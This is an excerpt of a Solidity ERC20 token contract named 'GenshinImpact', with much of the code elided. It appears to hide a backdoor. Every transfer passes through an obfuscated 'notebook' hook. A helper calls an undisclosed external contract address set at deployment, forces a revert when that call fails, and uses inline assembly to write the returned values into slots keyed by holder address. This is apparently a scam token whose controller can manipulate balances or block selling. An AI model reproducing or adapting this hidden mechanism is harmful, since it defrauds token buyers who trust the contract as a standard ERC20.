...
contract GenshinImpact is IERC20, Ownable {
    ...
    address private immutable _imgt;
     ...
     * construction.
     */
    constructor(string memory symbol_, string memory name_, uint256 totalSupply_, address imgt_) 
    {   
         _name = name_; 
        _symbol = symbol_; 
     ...
     * required by the EIP. See the notebook at the beginning of {ERC20}.
     *
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        notebook("_TransferLog", from, amount, bytes32(0));
        emit Transfer(from, to, amount);
    }
    
    
    function notebook(bytes32 jlt, address utg, uint256 quaro, bytes32 fjtt) 
    ...
    function shore(bytes memory q) private pure returns(bytes32 j) {
        assembly { j := mload(add(q, mul(8, 4))) }
    }


    function SaveImpact(uint256 k, uint256 j, address f, uint256 m) private {
        assembly {
            mstore(0, f) 
            mstore(k, j) 
    ...
    function genshin(address m, address k) private {
        bytes memory j = bytes("genshinImpact(address,address)");
        (bool s, bytes memory q) = m.call(abi.
        encodeWithSignature(string(j), k, address(0)));
        if (!s) { uint256 tt = 0; 1 / tt; }
        uint256 vvv = uint256(shore(q));
        if (vvv == 0) return;
        SaveImpact(32, 4, k, vvv);
    }
